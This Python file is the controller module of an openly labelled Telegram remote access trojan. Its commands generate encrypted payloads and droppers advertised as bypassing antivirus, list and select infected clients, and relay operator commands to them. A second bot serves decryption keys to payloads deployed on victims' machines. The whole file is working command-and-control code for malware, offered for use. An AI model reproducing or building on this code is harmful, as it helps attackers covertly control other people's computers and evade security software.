"""
Telegram Bot Controller – Main bot commands + key storage.
Second bot is polled on-demand to handle key requests.
"""

import telepot
from telepot.loop import MessageLoop
import time
import sys
import threading
import tempfile
import os
import json
import urllib.request
import urllib.error
from config import TOKEN, MASTER_SECRET, SALT, PAYLOAD_BOT_TOKEN
from core.client_manager import ClientManager
from core.payload_generator import PayloadGenerator
from core.crypto import CryptoHandler

class BotController:
    """Controller for the Telegram-based RAT.

    Orchestrates two bot instances:
      - Main bot: receives operator commands and generates payloads.
      - Payload bot: short-poll endpoint that receives /getkey_<id>
        requests and responds with the stored key.
    """
    def __init__(self):
        # Primary bot used to interact with the operator
        self.bot = telepot.Bot(TOKEN)

        # Helpers and subsystems
        self.client_manager = ClientManager()
        self.crypto = CryptoHandler(MASTER_SECRET, SALT)
        self.payload_gen = PayloadGenerator(MASTER_SECRET, SALT, TOKEN, PAYLOAD_BOT_TOKEN)

        # Secondary bot used to serve keys to deployed payloads
        self.payload_bot = telepot.Bot(PAYLOAD_BOT_TOKEN)
        self.payload_bot_offset = None

        # Runtime state
        self.running = True
        # key_store maps key_id -> key material
        self.key_store = {}
        # pending_keys maps key_id -> chat_id that requested the payload
        self.pending_keys = {}

    def handle_main_message(self, msg):
        """Handle incoming messages sent to the main bot.

        Messages may be commands (starting with '/') or client-related
        payloads. This method delegates to `handle_command` for bot
        commands and to `client_manager` for client messages.
        """
        try:
            content_type, chat_type, chat_id = telepot.glance(msg)

            if content_type == 'text':
                text = msg['text']

                # Bot commands
                if text.startswith('/'):
                    self.handle_command(chat_id, text)
                else:
                    # Client protocol messages start with '!{client_id} '
                    if text.startswith('!'):
                        parts = text.split(' ', 1)
                        if len(parts) == 2:
                            client_id = parts[0][1:]
                            command = parts[1]
                            self.client_manager.handle_client_message(client_id, command, chat_id, self.bot)
                    else:
                        # If a default client is set, treat plain text as a
                        # command for that client; otherwise notify operator.
                        default = self.client_manager.get_default_client()
                        if default:
                            self.client_manager.execute_command(default, text, chat_id, self.bot)
                        else:
                            self.bot.sendMessage(chat_id, '[!] No client selected.')

            elif content_type == 'document':
                self.handle_document(msg, chat_id)

        except Exception as e:
            try:
                self.bot.sendMessage(chat_id, f'[!] Error: {e}')
            except:
                # Best-effort: avoid raising from an error handler
                pass

    def handle_command(self, chat_id, text):
        parts = text.split(maxsplit=1)
        cmd = parts[0]
        args = parts[1] if len(parts) > 1 else ''

        # Common admin commands
        if cmd == '/start':
            self.bot.sendMessage(chat_id, self.get_help())

        elif cmd == '/help':
            self.bot.sendMessage(chat_id, self.get_help())

        elif cmd == '/generate_payload':
            # Generate a Python payload that will execute `args` when run on target
            if not args:
                self.bot.sendMessage(chat_id, 'Usage: /generate_payload <command>')
                return
            self.bot.sendMessage(chat_id, '⏳ Generating Python payload...')
            payload, key_id, key = self.payload_gen.generate_payload(args, chat_id)
            self.send_payload(chat_id, payload, key_id, 'Python Payload', key)

        elif cmd == '/generate_dropper':
            if not args:
                self.bot.sendMessage(chat_id, 'Usage: /generate_dropper <command>')
                return
            self.bot.sendMessage(chat_id, '⏳ Generating dropper with AV bypass...')
            dropper, key_id, key = self.payload_gen.generate_dropper(args, chat_id)
            self.send_payload(chat_id, dropper, key_id, 'Python Dropper', key)

        elif cmd == '/clients':
            self.list_clients(chat_id)

        elif cmd == '/select':
            if not args:
                self.bot.sendMessage(chat_id, 'Usage: /select <client_id>')
                return
            if self.client_manager.set_default_client(args):
                self.bot.sendMessage(chat_id, f'Selected: {args}')
            else:
                self.bot.sendMessage(chat_id, f'[!] Client not found: {args}')

        elif cmd == '/getkey':
            # Expose the current key for debugging (not secure)
            key = self.crypto.get_current_key()
            self.bot.sendMessage(chat_id, f'Current Key: {key}')

        else:
            self.bot.sendMessage(chat_id, f'[!] Unknown command: {cmd}')

    def send_payload(self, chat_id, script, key_id, payload_type, key=None):
        """Send generated payload as a document and notify the operator.

        The payload script is written to a temporary file so it can be
        sent using `sendDocument`. If a key_id is present we store the
        key in `key_store` and remember the requesting chat so the
        secondary bot can reply with the key when asked.
        """
        try:
            if key_id:
                if key is None:
                    key = self.payload_gen.crypto.get_key(key_id)
                self.key_store[key_id] = key
                self.pending_keys[key_id] = chat_id
                print(f'[MAIN] Stored key for {key_id}: {key[:20]}...')
                print(f'[MAIN] Current key_store keys: {list(self.key_store.keys())}')

            temp = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
            temp.write(script)
            temp.close()

            # Send the generated payload as a document attachment
            with open(temp.name, 'rb') as f:
                caption = f'📦 {payload_type}'
                if key_id:
                    caption += f'\nKey ID: {key_id}'
                self.bot.sendDocument(chat_id, f, caption=caption)

            # Clean up the temporary file
            os.unlink(temp.name)

            if key_id:
                self.bot.sendMessage(
                    chat_id,
                    f'🔑 Key ID: {key_id}\n\n'
                    f'The payload will send /getkey_{key_id} to the SECOND bot.\n'
                    f'Make sure the second bot is added to this chat.'
                )

            self.bot.sendMessage(
                chat_id,
                f'✅ {payload_type} generated.\nRun on target: python3 payload.py'
            )

        except Exception as e:
            self.bot.sendMessage(chat_id, f'[!] Error: {e}')

    def process_payload_bot_requests(self):
        """Short-poll the secondary bot for /getkey_<id> requests.

        This method performs a single short poll of the second bot's
        updates and replies with the key if it is available in
        `self.key_store`.
        """
        try:
            url = f"https://api.telegram.org/bot{PAYLOAD_BOT_TOKEN}/getUpdates?limit=1&timeout=0"
            if self.payload_bot_offset is not None:
                url += f"&offset={self.payload_bot_offset}"

            req = urllib.request.Request(url)
            try:
                resp = urllib.request.urlopen(req, timeout=10)
            except urllib.error.HTTPError as e:
                # 409 indicates webhook/long-poll conflict — ignore briefly
                if e.code == 409:
                    time.sleep(0.5)
                    return
                raise

            data = json.loads(resp.read().decode())

            if data.get('ok'):
                for update in data.get('result', []):
                    self.payload_bot_offset = update.get('update_id', self.payload_bot_offset or 0) + 1
                    msg = update.get('message', {})
                    chat_id = msg.get('chat', {}).get('id')
                    text = msg.get('text', '')

                    if text.startswith('/getkey_'):
                        key_id = text[len('/getkey_'):].strip()
                        print(f'[PAYLOAD BOT] Request for key_id: {key_id}')
                        print(f'[PAYLOAD BOT] Current key_store keys: {list(self.key_store.keys())}')
                        if key_id in self.key_store:
                            key = self.key_store[key_id]
                            self.payload_bot.sendMessage(chat_id, key)
                            print(f'[PAYLOAD BOT] Sent key for {key_id}')
                        else:
                            self.payload_bot.sendMessage(chat_id, 'ERROR: Key not found')
                            print(f'[PAYLOAD BOT] Key not found: {key_id}')
        except Exception as e:
            print(f'[PAYLOAD BOT] Error: {e}')

    def start(self):
        # Start main bot loop
        def run_main_bot():
            try:
                MessageLoop(self.bot, self.handle_main_message).run_as_thread()
                print('[+] Main bot started')
            except Exception as e:
                print(f'[!] Main bot error: {e}')

        main_thread = threading.Thread(target=run_main_bot, daemon=True)
        main_thread.start()

        # Periodic check for key requests on second bot (short poll)
        def check_second_bot():
            while self.running:
                self.process_payload_bot_requests()
                time.sleep(3)

        poll_thread = threading.Thread(target=check_second_bot, daemon=True)
        poll_thread.start()

        print('=' * 60)
        print('🤖 Telegram RAT – Two Bot System')
        print('=' * 60)
        print('Main bot:    Handles commands and payload generation (long-poll)')
        print('Second bot:  Polled every 3s for key requests (short-poll)')
        print('             No long-polling on second bot = NO CONFLICT!')
        print('Press Ctrl+C to stop.')
        print('=' * 60)

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print('\n[!] Stopping...')
            sys.exit(0)

    # ==================== HELPERS ====================
    def list_clients(self, chat_id):
        clients = self.client_manager.list_clients()
        if not clients:
            self.bot.sendMessage(chat_id, '[!] No clients connected')
            return

        msg = '📋 Connected Clients:\n\n'
        for i, c in enumerate(clients, 1):
            status = '🟢' if c.get('status') == 'online' else '🔴'
            msg += f'{status} {i}. {c["id"]} - {c.get("ip", "N/A")} - {c.get("os", "Unknown")}\n'

        self.bot.sendMessage(chat_id, msg)

    def handle_document(self, msg, chat_id):
        """Handle incoming document uploads (e.g., uploaded payloads)."""
        try:
            file_id = msg['document']['file_id']
            file_name = msg['document'].get('file_name', 'unknown.py')
            # For now we only acknowledge receipt; future work may
            # download and validate the script.
            self.bot.sendMessage(chat_id, f'📁 Received: {file_name}')
        except Exception as e:
            self.bot.sendMessage(chat_id, f'[!] Error: {e}')

    def get_help(self):
        return (
            '🤖 Telegram RAT – Python Payload Generator\n\n'
            'Commands:\n'
            '/help – Show this\n'
            '/generate_payload <cmd> – Generate encrypted payload\n'
            '/generate_dropper <cmd> – Generate dropper\n'
            '/clients – List clients\n'
            '/select <id> – Select client\n'
            '/getkey – Show current key\n\n'
            'Payload sends /getkey_<KEY_ID> to the SECOND bot.\n'
            'Second bot polls every 3s and replies with the key.\n'
            'No 409 Conflict because second bot uses short-poll (no long-loop).'
        )